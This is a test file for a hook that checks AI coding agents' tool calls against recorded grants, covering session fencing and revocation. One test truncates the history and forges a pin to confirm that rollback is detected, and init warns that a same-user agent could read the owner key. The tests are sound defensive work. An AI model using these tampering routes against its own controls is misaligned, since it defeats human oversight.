/**
 * End-to-end tests of the built `irontrellis-hook` binary: recorded stdin
 * samples for each host protocol (shaped after the documents cited in
 * src/protocols/*.ts) are piped through the command in a temporary project,
 * and stdout JSON, exit codes, the history and the handover file are checked.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, rmSync, existsSync, mkdtempSync, readFileSync, statSync, writeFileSync, mkdirSync, symlinkSync, lstatSync, readdirSync, realpathSync } from "node:fs";
import { createHash } from "node:crypto";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { commitTerms, createLocalDomain, createLocalOwner, keyPairFromPrivateKey, openHistoryStore, openLocalOwner, openLocalRuntime, openLocalSimulation, signHashWith } from "@ramex-labs/irontrellis";
import { mergeSettings, planSettings, writeSettingsAtomically, validateConfig, renderTemplate, mapTool, PROTOCOLS, controlCommand, protection, protectedTargets, hookEntryProgram } from "../dist/index.js";
const { FORMAT1_TEST_TOOLING } = await import("@ramex-labs/irontrellis/internal-format1"); // A-185.3 / A-194: older formats are test tooling

const BIN = resolve(fileURLToPath(new URL("../bin/irontrellis-hook.mjs", import.meta.url)));
/** What install claude-code writes by default: the /bin/sh wrapper with this node (as PATH names it, when PATH's node is this one) and the launcher's real path. */
const DEFAULT_NODE = (() => {
  for (const dir of (process.env.PATH ?? "").split(":")) {
    if (dir === "") continue;
    try { if (statSync(join(dir, "node")).isFile() && realpathSync(join(dir, "node")) === realpathSync(process.execPath)) return join(dir, "node"); } catch { /* next */ }
  }
  return process.execPath;
})();
const OURS = hookEntryProgram(DEFAULT_NODE, realpathSync(BIN));
const DAY = 86_400_000;

// Per-user state (~/.irontrellis) is redirected into a temporary directory for the whole run.
const STATE_HOME = mkdtempSync(join(tmpdir(), "irontrellis-home-"));
const RISK = "--i-understand-same-user-risk";

/** Run the command in `cwd` with `stdin`; returns { code, stdout, stderr, json }. */
function run(args, { cwd, stdin = "", env = {} } = {}) {
  const r = spawnSync(process.execPath, [BIN, ...args], { cwd, input: stdin, encoding: "utf8", env: { ...process.env, NO_COLOR: "1", IRONTRELLIS_HOME: STATE_HOME, ...env } });
  let json;
  try { json = r.stdout.trim() === "" ? undefined : JSON.parse(r.stdout); } catch { json = undefined; }
  return claudeDeny(args, { code: r.status, stdout: r.stdout, stderr: r.stderr, json });
}
/**
 * A Claude Code PreToolUse deny is exit 2, the reason on stderr and nothing on stdout (the coordinator's GO for proposal A):
 * every such reply is given the deny's JSON shape here, so the assertions below read it alike, and a Claude Code deny that
 * comes back as JSON (or at another exit code) fails at once. ask and allow stay JSON at exit 0; Codex and Cursor as before.
 */
function claudeDeny(args, r) {
  const at = args.indexOf("claude-code");
  if (at < 0 || args[at + 1] !== "PreToolUse") return r;
  assert.notEqual(r.json?.hookSpecificOutput?.permissionDecision, "deny", `a Claude Code deny must be exit 2, not JSON: ${r.stdout}`);
  if (r.code !== 2 || r.stdout !== "") return r;
  assert.match(r.stderr, /^\nIronTrellis · DENY: /, "a Claude Code deny's stderr starts with a newline (its own line under Claude Code's label), then the state word");
  return { ...r, json: { hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: r.stderr.slice(1).split("\n")[0] } } };
}
const hook = (agent, event, payload, cwd, env) => run([agent, event], { cwd, stdin: JSON.stringify(payload), env });

const project = () => realpathSync(mkdtempSync(join(tmpdir(), "irontrellis-hook-")));
const configOf = (dir) => JSON.parse(readFileSync(join(dir, "irontrellis-hook.json"), "utf8"));
const historyOf = (dir) => resolve(dir, configOf(dir).history);
const events = (dir) => openHistoryStore(historyOf(dir)).state().events;
const ownerOf = (dir) => {
  const config = configOf(dir);
  // The hook creates format-2 histories (A-85): the default writer.
  return openLocalOwner({ historyFile: historyOf(dir), domain: config.domain, owner: config.owner, controller: config.controller, now: () => Date.now() });
};
const sha = (text) => createHash("sha256").update(text, "utf8").digest("hex");
const keyFileOf = (dir, hostSessionId) => join(`${historyOf(dir)}.sessions`, `${sha(hostSessionId)}.json`);
const handoverOf = (dir, hostSessionId) => join(`${historyOf(dir)}.handovers`, `${sha(hostSessionId)}.json`);
const setConfig = (dir, patch) => { const path = join(dir, "irontrellis-hook.json"); writeFileSync(path, JSON.stringify({ ...configOf(dir), ...patch })); };
/** Claude Code / Codex "no decision": exit 0, nothing on stdout. */
const assertDefer = (r, reason) => { assert.equal(r.code, 0, r.stderr); assert.equal(r.stdout, ""); if (reason !== undefined) assert.match(r.stderr, reason); };
const esc = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

// ---------------------------------------------------------------- recorded host events (see src/protocols/*.ts for the sources)

const claude = {
  sessionStart: (dir, session = "cc-session-1", source = "startup") => ({ session_id: session, transcript_path: `${dir}/.claude/transcript.jsonl`, cwd: dir, permission_mode: "default", hook_event_name: "SessionStart", source }),
  preToolUse: (dir, tool_name, tool_input, session = "cc-session-1") => ({ session_id: session, transcript_path: `${dir}/.claude/transcript.jsonl`, cwd: dir, permission_mode: "default", hook_event_name: "PreToolUse", tool_name, tool_input, tool_use_id: "toolu_01ABC" }),
  stop: (dir, session = "cc-session-1") => ({ session_id: session, transcript_path: `${dir}/.claude/transcript.jsonl`, cwd: dir, permission_mode: "default", hook_event_name: "Stop", stop_hook_active: false, last_assistant_message: "Done." }),
  sessionEnd: (dir, session = "cc-session-1", reason = "prompt_input_exit") => ({ session_id: session, transcript_path: `${dir}/.claude/transcript.jsonl`, cwd: dir, permission_mode: "default", hook_event_name: "SessionEnd", reason }),
};
const codex = {
  sessionStart: (dir, session = "thr_123") => ({ session_id: session, transcript_path: `${dir}/.codex/rollout.jsonl`, cwd: dir, hook_event_name: "SessionStart", model: "gpt-5-codex", source: "startup" }),
  preToolUse: (dir, tool_name, tool_input, session = "thr_123") => ({ session_id: session, transcript_path: `${dir}/.codex/rollout.jsonl`, cwd: dir, hook_event_name: "PreToolUse", model: "gpt-5-codex", permission_mode: "default", turn_id: "turn_1", tool_name, tool_input, tool_use_id: "call_1" }),
  sessionEnd: (dir, session = "thr_123") => ({ session_id: session, transcript_path: `${dir}/.codex/rollout.jsonl`, cwd: dir, hook_event_name: "SessionEnd", reason: "other" }),
};
const cursorBase = (dir, hook_event_name) => ({ conversation_id: "conv-1", generation_id: "gen-1", model: "claude-sonnet", hook_event_name, cursor_version: "2.3", workspace_roots: [dir], user_email: null, transcript_path: null });
const cursor = {
  sessionStart: (dir) => ({ ...cursorBase(dir, "sessionStart"), session_id: "conv-1", is_background_agent: false, composer_mode: "agent" }),
  shell: (dir, command) => ({ ...cursorBase(dir, "beforeShellExecution"), command, cwd: dir }),
  mcp: (dir, mcp_server_name, tool_name, tool_input = {}) => ({ ...cursorBase(dir, "beforeMCPExecution"), tool_name, tool_input, mcp_server_name, command: "npx server" }),
  preToolUse: (dir, tool_name, tool_input) => ({ ...cursorBase(dir, "preToolUse"), tool_name, tool_input, tool_use_id: "tu-1", cwd: dir }),
  stop: (dir) => ({ ...cursorBase(dir, "stop"), status: "completed", loop_count: 1 }),
  sessionEnd: (dir) => ({ ...cursorBase(dir, "sessionEnd"), session_id: "conv-1", reason: "completed", duration_ms: 1200, is_background_agent: false, final_status: "completed" }),
};

// ---------------------------------------------------------------- init

test("init: the default layout keeps the history, the owner key and the session keys outside the project", () => {
  const dir = project();
  const r = run(["init", "--agent", "claude-code", "--json"], { cwd: dir });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.json.created, true);
  const stateDir = join(STATE_HOME, "projects", sha(dir).slice(0, 16));
  assert.equal(r.json.stateDir, stateDir);
  assert.equal(configOf(dir).history, join(stateDir, "history.jsonl"));
  // The project keeps only the config.
  assert.deepEqual(readdirSync(dir), ["irontrellis-hook.json"]);
  if (process.platform !== "win32") assert.equal(statSync(stateDir).mode & 0o777, 0o700); // POSIX modes (Windows: ACLs, docs/PLATFORMS.md §3)
  if (process.platform !== "win32") assert.equal(statSync(join(STATE_HOME, "projects")).mode & 0o777, 0o700); // POSIX modes (Windows: ACLs, docs/PLATFORMS.md §3)
  if (process.platform !== "win32") assert.equal(statSync(join(stateDir, "history.jsonl.owner-key.json")).mode & 0o777, 0o600); // POSIX modes (Windows: ACLs, docs/PLATFORMS.md §3)
  // The same-user warning is printed (stderr, so --json stays clean) and returned.
  assert.match(r.stderr, /WARNING: same-user layout/);
  assert.match(r.stderr, /no hard boundary between the agent and the owner key/);
  assert.match(r.stderr, /any run-shell grant is equivalent to owner authority/);
  assert.match(r.stderr, /separate OS user/);
  assert.ok(r.json.warnings.some((w) => /same-user layout/.test(w)));
  // The genesis commits the history to a next owner key (pre-rotation), whose file sits in the state directory until the operator moves it offline.
  // …and admits the hook's own connector agent and session (docs/API.md §2: it signs CONNECTOR refusals only).
  assert.deepEqual(events(dir).map((e) => e.type), ["DEPLOYMENT_INITIALIZED", "PRINCIPAL_CREATED", "AGENT_CREATED", "ROLE_CREATED", "AGENT_APPOINTED", "AGENT_CREATED", "RUNTIME_SESSION_ADMITTED"]);
  assert.equal(events(dir)[5].data.agentId, configOf(dir).connector.agentId);
  assert.equal(events(dir)[0].data.nextKeyDigests.length, 1);
  if (process.platform !== "win32") assert.equal(statSync(join(stateDir, "history.jsonl.owner-next-key.json")).mode & 0o777, 0o600); // POSIX modes (Windows: ACLs, docs/PLATFORMS.md §3)
  assert.ok(r.json.warnings.some((w) => w.includes("move it offline; pre-rotation only protects you if the next key is not on this host")));
  const config = configOf(dir);
  assert.equal(config.agentId, "claude-code");
  assert.equal(config.policy.unmapped, "ask");
  assert.deepEqual(config.decisions, { onAllow: "defer", onReadOnly: "defer" });
  assert.ok(config.policy.sideEffecting.some((x) => x.tool === "Bash" && x.action === "run-shell"));
  // Human output names the state directory (--verbose: every step; by default, one line).
  const human = run(["init", "--force", "--verbose"], { cwd: dir });
  assert.equal(human.code, 0, human.stderr);
  assert.match(human.stdout, new RegExp(`state: ${esc(stateDir)} holds the history.*outside the project`));
  const plain = run(["init", "--force"], { cwd: dir });
  assert.equal(plain.code, 0, plain.stderr);
  assert.match(plain.stdout, /\nIts history and keys are in .*, outside the project: back that folder up separately\.\n/);
  assert.match(plain.stderr, /\n {2}- Same OS user: the agent runs as you, so it could read the owner key/);
  assert.equal(events(dir).length, 7); // idempotent on the same history (the connector session is reused)
  const refused = run(["init"], { cwd: dir });
  assert.equal(refused.code, 1);
  assert.match(refused.stderr, /exists/);
});

test("init refuses --allow run-shell unless the same-user risk is acknowledged", () => {
  const dir = project();
  const refused = run(["init", "--allow", "run-shell,write-file", "--expires", "+1d"], { cwd: dir });
  assert.equal(refused.code, 1);
  assert.match(refused.stderr, /refusing --allow run-shell: on the same OS user a run-shell grant is equivalent to owner authority/);
  assert.match(refused.stderr, /--i-understand-same-user-risk/);
  assert.ok(!existsSync(join(dir, "irontrellis-hook.json")));
  const r = run(["init", "--allow", "run-shell,write-file", "--expires", "+1d", RISK, "--json"], { cwd: dir });
  assert.equal(r.code, 0, r.stderr);
  assert.match(r.json.grant, /^grant:claude-code:/);
  const grant = events(dir).find((e) => e.type === "AUTHORITY_GRANTED");
  assert.deepEqual(grant.data.grant.constraints.actions, ["run-shell", "write-file"]);
  assert.deepEqual(grant.data.grant.constraints.resources, [`repo:${dir}`]);
  // Actions that do not reach a shell need no acknowledgement.
  const other = project();
  assert.equal(run(["init", "--allow", "write-file"], { cwd: other }).code, 0);
});

test("init with a project-local --history writes a .gitignore into the state directory it creates", () => {
  const dir = project();
  const r = run(["init", "--history", ".irontrellis/history.jsonl", "--json"], { cwd: dir });
  assert.equal(r.code, 0, r.stderr);
  const gitignore = join(dir, ".irontrellis", ".gitignore");
  assert.deepEqual(r.json.gitignores, [gitignore]);
  assert.match(readFileSync(gitignore, "utf8"), /^\*$/m);
  if (process.platform !== "win32") assert.equal(statSync(join(dir, ".irontrellis")).mode & 0o777, 0o700); // POSIX modes (Windows: ACLs, docs/PLATFORMS.md §3)
  assert.equal(configOf(dir).history, join(dir, ".irontrellis", "history.jsonl"));
  assert.match(r.stderr, /NOTE: the history and owner key are inside the project/);
  // A history directly in the project root: no directory is created, so the note asks for a .gitignore entry instead.
  const flat = project();
  const f = run(["init", "--history", "trellis.jsonl", "--json"], { cwd: flat });
  assert.equal(f.code, 0, f.stderr);
  assert.deepEqual(f.json.gitignores, []);
  assert.match(f.stderr, /Add "trellis\.jsonl\*" to \.gitignore/);
});

test("init --history <existing> writes the owner and controller the history records, and verifies the config (M4)", async () => {
  const dir = project();
  const store = mkdtempSync(join(tmpdir(), "irontrellis-existing-"));
  const history = join(store, "shared.jsonl");
  const domain = createLocalDomain();
  const alice = await createLocalOwner({ historyFile: history, domain, owner: "principal:alice", controller: "controller:ops", now: () => Date.now() });
  await alice.createAgent({ id: "claude-code" });
  // A mismatching --owner is refused before anything is written.
  const wrong = run(["init", "--history", history, "--owner", "principal:bob"], { cwd: dir });
  assert.equal(wrong.code, 1);
  assert.match(wrong.stderr, /--owner principal:bob does not match the owner recorded .* \(principal:alice\)/);
  assert.ok(!existsSync(join(dir, "irontrellis-hook.json")));
  const r = run(["init", "--history", history, "--json"], { cwd: dir });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.json.created, false);
  assert.ok(r.json.steps.some((s) => /config .* written and verified \(owner principal:alice, agent claude-code, controller controller:ops/.test(s)));
  const config = configOf(dir);
  assert.equal(config.owner, "principal:alice");
  assert.equal(config.controller, "controller:ops");
  // The config works: a session is admitted and a tool is decided.
  const start = hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  assert.equal(start.code, 0, start.stderr);
  assert.match(start.json.hookSpecificOutput.additionalContext, /runtime session:cc-session-1, epoch 1/);
  const write = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Write", { file_path: `${dir}/a`, content: "" }), dir);
  assert.equal(write.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(write.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · DENY: claude-code may not write files in \S+ \(NO_AUTHORITY; write-file on repo:.*; head \d+\)$/);
  // A history whose owner key is not next to it is refused (the hook could not admit sessions).
  const keyless = join(mkdtempSync(join(tmpdir(), "irontrellis-keyless-")), "k.jsonl");
  writeFileSync(keyless, readFileSync(history));
  const noKey = run(["init", "--history", keyless], { cwd: project() });
  assert.equal(noKey.code, 1);
  assert.match(noKey.stderr, /owner key .* is not at .*k\.jsonl\.owner-key\.json/);
});

// ---------------------------------------------------------------- Claude Code

test("claude-code: SessionStart admits a runtime session and reports the open duties and permissions", () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  const r = hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.json.hookSpecificOutput.hookEventName, "SessionStart");
  assert.equal(r.json.systemMessage, undefined);
  const context = r.json.hookSpecificOutput.additionalContext;
  assert.match(context, /session cc-session-1 .* opens with 0 open duties\./);
  assert.match(context, new RegExp(`This session may run-shell on repo:${esc(dir)}\\.`));
  assert.match(context, /It may not write-file on repo:.*\(ACTION_NOT_ALLOWED\)/);
  assert.match(context, /left to the host's own permission check/);
  const admitted = events(dir).find((e) => e.type === "RUNTIME_SESSION_ADMITTED" && e.data.agentId === "claude-code");
  assert.equal(admitted.data.sessionId, "session:cc-session-1");
  assert.equal(admitted.data.agentId, "claude-code");
  assert.equal(admitted.data.controllerId, "controller:irontrellis-hook");
  assert.equal(admitted.data.credentialScheme, "ed25519");
  const keyFile = keyFileOf(dir, "cc-session-1");
  assert.ok(!keyFile.startsWith(dir), "the session key lives outside the project");
  if (process.platform !== "win32") assert.equal(statSync(keyFile).mode & 0o777, 0o600); // POSIX modes (Windows: ACLs, docs/PLATFORMS.md §3)
  const key = JSON.parse(readFileSync(keyFile, "utf8"));
  assert.equal(key.credential, admitted.data.credentialPublicKey);
  assert.equal(key.keyId, admitted.data.credentialKeyId);
  assert.equal(key.hostSessionId, "cc-session-1");
  // Resuming the same session writes nothing new.
  const before = events(dir).length;
  const resume = hook("claude-code", "SessionStart", claude.sessionStart(dir, "cc-session-1", "resume"), dir);
  assert.equal(resume.code, 0, resume.stderr);
  assert.equal(events(dir).length, before);
});

test("claude-code: parallel sessions of one agent are serialized; a session that ended is fenced by the next (M3)", () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  assert.equal(hook("claude-code", "SessionStart", claude.sessionStart(dir, "s-1"), dir).code, 0);
  const before = events(dir).length;
  // s-2 starts while s-1 is live and holds its key: not admitted, nothing written, the user is told.
  const second = hook("claude-code", "SessionStart", claude.sessionStart(dir, "s-2"), dir);
  assert.equal(second.code, 0, second.stderr);
  assert.match(second.json.hookSpecificOutput.additionalContext, /session s-2 was NOT admitted: agent claude-code already has a live session \(session:s-1/);
  assert.match(second.json.systemMessage, /Parallel sessions of the same agent are serialized by design/);
  assert.equal(events(dir).length, before);
  assert.ok(!existsSync(keyFileOf(dir, "s-2")));
  const refused = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "npm test" }, "s-2"), dir);
  assert.equal(refused.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(refused.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · DENY: .*\(SESSION_NOT_FOUND\)$/);
  // s-1 is unaffected.
  assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "npm test" }, "s-1"), dir), /IronTrellis · ALLOW/);
  // s-1 ends: its key is released (the private key is removed), so s-2 may start and fence it.
  const end = hook("claude-code", "SessionEnd", claude.sessionEnd(dir, "s-1"), dir);
  assert.match(end.stderr, /Session key released\./);
  const tombstone = JSON.parse(readFileSync(keyFileOf(dir, "s-1"), "utf8"));
  assert.equal(tombstone.privateKey, undefined);
  assert.equal(tombstone.sessionId, "session:s-1");
  const after = hook("claude-code", "SessionStart", claude.sessionStart(dir, "s-2"), dir);
  assert.match(after.json.hookSpecificOutput.additionalContext, /runtime session:s-2, epoch 2, fences session:s-1/);
  // s-2's refused call above was recorded as a CONNECTOR refusal of the hook's own session (A-38.4: no current session).
  assert.deepEqual(events(dir).slice(before).map((e) => e.type), ["REQUEST_REFUSED", "CONTROL_EPOCH_ADVANCED", "RUNTIME_SESSION_ADMITTED"]);
  assert.equal(events(dir)[before].data.refusalSource, "CONNECTOR");
  // The fenced session's calls are refused; the new one's are decided.
  const fenced = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Read", { file_path: `${dir}/a` }, "s-1"), dir);
  assert.equal(fenced.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(fenced.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · DENY: session:s-1 \(epoch 1\) was fenced by a newer session of claude-code.*\(SESSION_FENCED\)$/);
  assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }, "s-2"), dir), /IronTrellis · ALLOW/);
  // Resuming s-1 after its end fences s-2 only when s-2's key is released; here s-2 is live, so s-1 is refused.
  const resumed = hook("claude-code", "SessionStart", claude.sessionStart(dir, "s-1", "resume"), dir);
  assert.match(resumed.json.hookSpecificOutput.additionalContext, /session s-1 was NOT admitted/);
});

test("claude-code: session checks at tool events — never started, expired, fenced by the operator, released (M3)", async () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  // No SessionStart for this host session: refused.
  const unknown = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }, "never-started"), dir);
  assert.equal(unknown.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(unknown.json.hookSpecificOutput.permissionDecisionReason, /no runtime session of claude-code is admitted for host session never-started.*\(SESSION_NOT_FOUND\)$/);
  // An expired session.
  setConfig(dir, { sessionTtlMs: 2500 });
  hook("claude-code", "SessionStart", claude.sessionStart(dir, "short"), dir);
  assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }, "short"), dir));
  await new Promise((r) => setTimeout(r, 2600));
  const expired = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }, "short"), dir);
  assert.match(expired.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · DENY: session:short expired at.*\(SESSION_EXPIRED\)$/);
  // An expired session does not block the next one (no epoch advance needed).
  setConfig(dir, { sessionTtlMs: DAY });
  const next = hook("claude-code", "SessionStart", claude.sessionStart(dir, "long"), dir);
  assert.match(next.json.hookSpecificOutput.additionalContext, /runtime session:long, epoch 1\)/);
  // The operator advances the epoch through the core API: the live session is fenced at its next call.
  const owner = ownerOf(dir);
  await owner.advanceEpoch({ agent: "claude-code", from: 1, to: 2 });
  const fenced = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }, "long"), dir);
  assert.match(fenced.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · DENY: .*\(SESSION_FENCED\)$/);
  // `session list` / `session release`: an operator releases a session that never sent SessionEnd.
  hook("claude-code", "SessionStart", claude.sessionStart(dir, "crashed"), dir);
  const listed = run(["session", "list", "--json"], { cwd: dir });
  assert.equal(listed.code, 0, listed.stderr);
  assert.ok(listed.json.some((e) => e.hostSessionId === "crashed" && e.current && !e.released));
  assert.match(hook("claude-code", "SessionStart", claude.sessionStart(dir, "after-crash"), dir).json.hookSpecificOutput.additionalContext, /NOT admitted/);
  const released = run(["session", "release", "crashed"], { cwd: dir });
  assert.equal(released.code, 0, released.stderr);
  assert.match(released.stdout, /released crashed \(session:crashed\)/);
  const gone = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }, "crashed"), dir);
  assert.match(gone.json.hookSpecificOutput.permissionDecisionReason, /session:crashed \(host session crashed\) has ended or was released.*\(SESSION_NOT_FOUND\)$/);
  assert.match(hook("claude-code", "SessionStart", claude.sessionStart(dir, "after-crash"), dir).json.hookSpecificOutput.additionalContext, /runtime session:after-crash, epoch 3, fences session:crashed/);
  assert.equal(run(["session", "release", "crashed"], { cwd: dir }).code, 1); // nothing left to release
});

test("claude-code: PreToolUse defers on ALLOW and read-only tools, and answers deny / ask per the recorded grants (H1)", async () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  // ALLOW is no decision: Claude Code's own permission rules and prompt still apply.
  const bash = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "npm test", description: "Run tests" }), dir);
  assertDefer(bash, /^IronTrellis · ALLOW: claude-code run-shell on repo:.*authority grant:claude-code:.*left to the host's own permission check/);
  const write = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Write", { file_path: `${dir}/a.txt`, content: "x" }), dir);
  assert.equal(write.code, 2, "a deny is exit 2");
  assert.equal(write.stdout, "", "with nothing on stdout");
  assert.equal(write.json.hookSpecificOutput.hookEventName, "PreToolUse");
  assert.equal(write.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(write.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · DENY: claude-code may not write files in \S+ \(ACTION_NOT_ALLOWED; ACTION_NOT_ALLOWED at grant:claude-code:.*; write-file on repo:.*; head \d+\)$/);
  const edit = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Edit", { file_path: `${dir}/a.txt`, old_string: "a", new_string: "b" }), dir);
  assert.equal(edit.json.hookSpecificOutput.permissionDecision, "deny");
  const read = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Read", { file_path: `${dir}/a.txt` }), dir);
  assertDefer(read, /read-only/);
  for (const tool of ["WebFetch", "WebSearch", "Task"]) assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, tool, { url: "https://example.com", prompt: "x" }), dir), /read-only/);
  const unmapped = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Deploy", { target: "prod" }), dir);
  assert.equal(unmapped.json.hookSpecificOutput.permissionDecision, "ask");
  assert.match(unmapped.json.hookSpecificOutput.permissionDecisionReason, /no policy rule matches tool "Deploy"; referred to you/);
  const mcp = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "mcp__github__create_issue", { title: "x" }), dir);
  assert.equal(mcp.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(mcp.json.hookSpecificOutput.permissionDecisionReason, /call-mcp on mcp:github/);
  // A grant recorded through the core API is honoured on the next call; its revocation too.
  const owner = ownerOf(dir);
  await owner.grant({ id: "grant:mcp", to: "claude-code", actions: ["call-mcp"], resources: ["mcp:github"], expiresAt: Date.now() + DAY });
  assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "mcp__github__create_issue", { title: "x" }), dir), /IronTrellis · ALLOW/);
  await owner.revoke("grant:mcp");
  const revoked = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "mcp__github__create_issue", { title: "x" }), dir);
  assert.equal(revoked.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(revoked.json.hookSpecificOutput.permissionDecisionReason, /REVOKED/);
  // A decision writes nothing to the history.
  const count = events(dir).length;
  hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir);
  assert.equal(events(dir).length, count);
});

test("R1/R2: PreToolUse on a truncated history with an unattested pin, or an older copy behind the anchor log, is refused (exit 2)", async () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  const history = historyOf(dir);
  const owner = ownerOf(dir);
  await owner.grant({ id: "grant:mcp", to: "claude-code", actions: ["call-mcp"], resources: ["mcp:github"], expiresAt: Date.now() + DAY });
  const call = () => hook("claude-code", "PreToolUse", claude.preToolUse(dir, "mcp__github__create_issue", { title: "x" }), dir);
  assertDefer(call(), /IronTrellis · ALLOW/);
  const beforeRevoke = { file: readFileSync(history), pin: readFileSync(`${history}.head`) };
  await owner.revoke("grant:mcp");
  assert.equal(call().json.hookSpecificOutput.permissionDecision, "deny");
  const revoked = { file: readFileSync(history), pin: readFileSync(`${history}.head`) };
  // R1: cut the revocation and write an unattested pin at the new head (every field of it is public; no key used).
  const kept = readFileSync(history, "utf8").split("\n").filter(Boolean).slice(0, -1);
  writeFileSync(history, `${kept.join("\n")}\n`);
  const head = openHistoryStore(history, { inspect: true }).head();
  writeFileSync(`${history}.head`, JSON.stringify({ version: "irontrellis-pinned-head/1", ...head, recordHash: JSON.parse(kept.at(-1)).recordHash, pinnedAt: Date.now() }));
  const forged = call();
  assert.equal(forged.code, 2, forged.stderr);
  assert.equal(forged.stdout, "");
  assert.match(forged.stderr, /^\nIronTrellis · DENY: ROLLBACK_DETECTED \(PIN_UNATTESTED\): the pinned head carries no owner attestation, so it cannot rule out a truncation.*Every tool call is refused/);
  // The other hosts refuse too (Cursor's permission answer is deny).
  assert.equal(hook("codex", "PreToolUse", codex.preToolUse(dir, "Bash", { command: "ls" }), dir).code, 2);
  const cursorShell = hook("cursor", "beforeShellExecution", cursor.shell(dir, "ls"), dir);
  assert.equal(cursorShell.code, 2);
  // R2: the revoked history anchored, then an older copy restored with its own genuinely attested pin.
  writeFileSync(history, revoked.file);
  writeFileSync(`${history}.head`, revoked.pin);
  const { anchorHead, loadOwnerKeyFile, openHistoryStore: open } = await import("@ramex-labs/irontrellis");
  await anchorHead(open(history), loadOwnerKeyFile(`${history}.owner-key.json`), undefined, { id: "anchor:hook", anchoredAt: Date.now() });
  writeFileSync(history, beforeRevoke.file);
  writeFileSync(`${history}.head`, beforeRevoke.pin);
  const restored = call();
  assert.equal(restored.code, 2, restored.stderr);
  assert.match(restored.stderr, /^\nIronTrellis · DENY: ROLLBACK_DETECTED \(ANCHOR_LOG_ROLLBACK\): the anchor log holds an owner-attested head that the history file no longer contains/);
});

test("decisions.onAllow / onReadOnly \"allow\" opt into answering allow (H1)", () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  setConfig(dir, { decisions: { onAllow: "allow" } });
  const bash = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "npm test" }), dir);
  assert.equal(bash.json.hookSpecificOutput.permissionDecision, "allow");
  assert.match(bash.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · ALLOW: claude-code run-shell/);
  assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Read", { file_path: `${dir}/a` }), dir)); // onReadOnly still defers
  setConfig(dir, { decisions: { onAllow: "defer", onReadOnly: "allow" } });
  assert.equal(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Read", { file_path: `${dir}/a` }), dir).json.hookSpecificOutput.permissionDecision, "allow");
  assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir));
  // DENY stays deny whatever the decisions say.
  assert.equal(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Write", { file_path: `${dir}/a`, content: "" }), dir).json.hookSpecificOutput.permissionDecision, "deny");
  setConfig(dir, { decisions: { onAllow: "yes" } });
  assert.match(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir).stderr, /decisions\.onAllow must be "defer" or "allow"/);
});

test("claude-code: Stop refreshes and SessionEnd finalises the handover record", () => {
  const dir = project();
  run(["init"], { cwd: dir });
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  const stop = hook("claude-code", "Stop", claude.stop(dir), dir);
  assert.equal(stop.code, 0, stop.stderr);
  assert.equal(stop.stdout, "");
  const file = handoverOf(dir, "cc-session-1");
  assert.ok(!file.startsWith(dir), "the handover lives outside the project");
